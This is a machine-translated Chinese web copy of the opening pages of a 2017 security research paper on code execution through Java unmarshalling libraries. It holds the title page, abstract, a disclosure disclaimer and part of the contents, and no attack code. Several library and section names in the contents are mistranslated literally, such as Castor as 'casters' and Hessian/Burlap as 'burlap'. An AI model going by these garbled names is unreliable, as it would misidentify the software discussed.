
<!-- saved from url=(0051)https://translate.googleusercontent.com/translate_f -->
<html lang="zh-CN" class="translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="google" content="notranslate">
<script>(function(){/*

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/
(function(){function e(g){this.t={};this.tick=function(h,k,f){this.t[h]=[void 0!=f?f:(new Date).getTime(),k];if(void 0==f)try{window.console.timeStamp("CSI/"+h)}catch(m){}};this.getStartTickTime=function(){return this.t.start[0]};this.tick("start",null,g)}var a;if(window.performance)var d=(a=window.performance.timing)&&a.responseStart;var l=0<d?new e(d):new e;window.jstiming={Timer:e,load:l};if(a){var b=a.navigationStart;0<b&&d>=b&&(window.jstiming.srt=d-b)}if(a){var c=window.jstiming.load;0<b&&d>=
b&&(c.tick("_wtsrt",void 0,b),c.tick("wtsrt_","_wtsrt",d),c.tick("tbsd_","wtsrt_"))}try{a=null,window.chrome&&window.chrome.csi&&(a=Math.floor(window.chrome.csi().pageT),c&&0<b&&(c.tick("_tbnd",void 0,window.chrome.csi().startE),c.tick("tbnd_","_tbnd",b))),null==a&&window.gtbExternal&&(a=window.gtbExternal.pageT()),null==a&&window.external&&(a=window.external.pageT,c&&0<b&&(c.tick("_tbnd",void 0,window.external.startE),c.tick("tbnd_","_tbnd",b))),a&&(window.jstiming.pt=a)}catch(g){}})();}).call(window);
</script><script>_intlStrings._originalText = "英语原文:";_intlStrings._interfaceDirection="ltr";_intlStrings._interfaceAlign="left";_intlStrings._langpair="en|zh-CN";_intlStrings._feedbackUrl="https://translate.google.com/translate_suggestion";_intlStrings._currentBy="当前的翻译是由%2$s在 %1$s完成的";_intlStrings._unknown="佚名译者";_intlStrings._suggestTranslation="更好的翻译建议"  ;_intlStrings._submit="贡献力量";_intlStrings._suggestThanks="感谢您为 Google 翻译提供翻译建议。";_intlStrings._reverse=false;_intlStrings._staticContentPath="https://www.gstatic.com/translate/infowindow/";</script><style type="text/css">.google-src-text {display: none !important} .google-src-active-text {display: block!important;color:black!important; font-size:12px!important;font-family:arial,sans-serif!important}.google-src-active-text a {font-size:12px!important}.google-src-active-text a:link {color:#00c!important;text-decoration:underline!important}.google-src-active-text a:visited {color:purple!important;text-decoration:underline!important}.google-src-active-text a:active {color:red!important;text-decoration:underline!important}</style><meta http-equiv="X-Translated-By" content="Google"><link href="https://translate.googleusercontent.com/marshalsec.pdf" hreflang="en" rel="alternate machine-translated-from"><link href="./Java 解组器安全性_files/css" rel="stylesheet" type="text/css"><!--<base href="" target="_top">--><base href="." target="_top">

<meta name="Author" content="Moritz Bechler &lt;mbechler@eenterphace.org&gt;">
<meta name="Title" content="Java Unmarshaller Security">
<meta name="Creator" content="LaTeX with hyperref package">
<meta name="Producer" content="pdfTeX-1.40.16">
<meta name="Keywords" content="Java, remote code execution, serialization, deserialization, marshalling, unmarshalling">
<meta name="CreationDate" content="D:20170522125711+02&#39;00&#39;">
<meta name="ModDate" content="D:20170522125711+02&#39;00&#39;">
<meta name="Fullbanner" content="This is pdfTeX, Version 3.14159265-2.6-1.40.16 (TeX Live 2015) kpathsea version 6.2.2">
<title>Java 解组器安全性</title>
<link type="text/css" rel="stylesheet" charset="UTF-8" href="./Java 解组器安全性_files/translateelement.css"><script type="text/javascript" charset="UTF-8" src="./Java 解组器安全性_files/m=el_main"></script></head><body bgcolor="#ffffff" vlink="blue" link="blue">
        <style>
          .spinner-container {
            width:25%;
            top:20px;
            left:50%;
            margin-left:-12.5%;
            border-radius:8px;
            position:fixed;
            text-align:center;
            box-shadow:0 0 10px rgba(0,0,0,0.24);
            background:#fff;
            overflow:hidden;
          }

          .spinner-container p{
            font-family:'Roboto', Arial, sans-serif;
            color:rgba(0,0,0,0.87);
            margin:12px 0 16px 0;
            padding:0;
            font-size:12px;
          }

          .spinner-container img{
            width:22px;
            height:22px;
            margin:16px 0 0;
            padding:0;
          }
        </style>
        <div class="spinner-container notranslate" id="gt-dt-spinner" style="display: none;">
         <img src="./Java 解组器安全性_files/progress_spinner_color_20dp@2x.gif">
         <p>正在翻译...</p>
        </div>
      <iframe src="./Java 解组器安全性_files/translate_un.html" width="0" height="0" frameborder="0" style="width:0px;height:0px;border:0px;display:none;"></iframe>
<table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="1"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 1 页</font></font></b></a></font></td></tr></tbody></table><font size="4" face="Times"><span style="font-size:28px;font-family:Times">
<div style="position:absolute;top:394;left:254"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Java 解组器安全性</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:431;left:289"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将数据转化为代码执行</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:19px;font-family:Times">
<div style="position:absolute;top:470;left:378"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">莫里茨·贝克勒</font></font></nobr></div>
<div style="position:absolute;top:497;left:309"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;</font></font><a href="mailto:mbechler@eenterphace.org"></a><font color="#0000cc"><a href="mailto:mbechler@eenterphace.org"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mbechler@eenterphace.org</font></font></a></font><a href="mailto:mbechler@eenterphace.org"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;</font></font></nobr></div>
<div style="position:absolute;top:537;left:385"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2017 年 5 月 22 日</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:604;left:220"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Chris Frohoff 和 Garbriel Lawrence 已经过去两年多了</font></font></nobr></div>
<div style="position:absolute;top:622;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">介绍了他们对 Java 对象反序列化漏洞的研究</font></font></nobr></div>
<div style="position:absolute;top:640;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最终导致最有可能是最大的远程浪潮</font></font></nobr></div>
<div style="position:absolute;top:658;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Java 历史中的代码执行错误。</font><font style="vertical-align: inherit;">对此事的研究表明</font></font></nobr></div>
<div style="position:absolute;top:676;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;" class="">这些漏洞不仅限于具有表现力的机制</font></font></nobr></div>
<div style="position:absolute;top:694;left:204"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Java 序列化或 XStream，但有些可能适用于其他</font></font></nobr></div>
<div style="position:absolute;top:712;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机制也是如此。</font><font style="vertical-align: inherit;">本文提出了一个分析，包括利用</font></font></nobr></div>
<div style="position:absolute;top:730;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许（编辑）的各种开源 Java 编组库的详细信息</font></font></nobr></div>
<div style="position:absolute;top:747;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任意的、攻击者提供的类型的解组。</font><font style="vertical-align: inherit;">这表明无论</font></font></nobr></div>
<div style="position:absolute;top:765;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个过程是如何执行的以及它是什么隐式约束</font></font></nobr></div>
<div style="position:absolute;top:783;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">易于使用类似的开发技术。</font><font style="vertical-align: inherit;">大多数描述的机制，</font></font></nobr></div>
<div style="position:absolute;top:801;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管几乎所有的表达都不如 Java 序列化，</font></font></nobr></div>
<div style="position:absolute;top:819;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更容易被利用——在一些情况下是 JDK 标准</font></font></nobr></div>
<div style="position:absolute;top:837;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">库代码足以在解组期间实现代码执行</font></font></nobr></div>
<div style="position:absolute;top:855;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过程。</font></font></nobr></div>
<div style="position:absolute;top:880;left:220"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">免责声明：</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此处提供的所有信息仅用于教育目的</font></font></nobr></div>
<div style="position:absolute;top:898;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目的。</font><font style="vertical-align: inherit;">所有引用的漏洞都已向其重新披露</font></font></nobr></div>
<div style="position:absolute;top:916;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">负责任的供应商。</font><font style="vertical-align: inherit;">尽管所有供应商都获得了大量</font></font></nobr></div>
<div style="position:absolute;top:934;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间，一些漏洞此时可能仍未修复。</font><font style="vertical-align: inherit;">作者</font></font></nobr></div>
<div style="position:absolute;top:952;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，本文认为这样做是为了更大的利益</font></font></nobr></div>
<div style="position:absolute;top:970;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息更广泛可用。</font></font></nobr></div>
<div style="position:absolute;top:1189;left:443"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:1437;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="2"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第2页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:19px;font-family:Times">
<div style="position:absolute;top:1595;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:1637;left:167"><nobr><b><a href="https://translate.googleusercontent.com/translate_f#4"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 简介</font></font></a></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:1637;left:717"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:1670;left:167"><nobr><b><a href="https://translate.googleusercontent.com/translate_f#5"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 工装</font></font></a></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:1670;left:717"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:1702;left:167"><nobr><b><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 编组库</font></font></a></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:1702;left:717"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:1720;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1 基于 Bean 属性的编组器</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">6</font></font></font></nobr></div>
<div style="position:absolute;top:1738;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.1 SnakeYAML </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">6</font></font></font></nobr></div>
<div style="position:absolute;top:1756;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.2 jYAML </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">7</font></font></font></nobr></div>
<div style="position:absolute;top:1774;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.3 YamlBeans </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">7</font></font></font></nobr></div>
<div style="position:absolute;top:1792;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.4 Apache Flex BlazeDS </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">8</font></font></font></nobr></div>
<div style="position:absolute;top:1810;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.5 Red5 IO AMF </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">8</font></font></font></nobr></div>
<div style="position:absolute;top:1828;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#9"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.6 杰克逊</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">9</font></font></font></nobr></div>
<div style="position:absolute;top:1846;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#10"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.7 脚轮</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">10</font></font></font></nobr></div>
<div style="position:absolute;top:1864;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#10"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.8 Java XMLDecoder </font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">10</font></font></font></nobr></div>
<div style="position:absolute;top:1882;left:190"><nobr><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2 基于现场的编组器</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">11</font></font></font></nobr></div>
<div style="position:absolute;top:1900;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.1 Java 序列化</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">11</font></font></font></nobr></div>
<div style="position:absolute;top:1918;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.2 克里奥</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">12</font></font></font></nobr></div>
<div style="position:absolute;top:1936;left:224"><nobr><a href="https://translate.googleusercontent.com/translate_f#13"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.3 粗麻布/粗麻布</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">13</font></font></font></nobr></div>
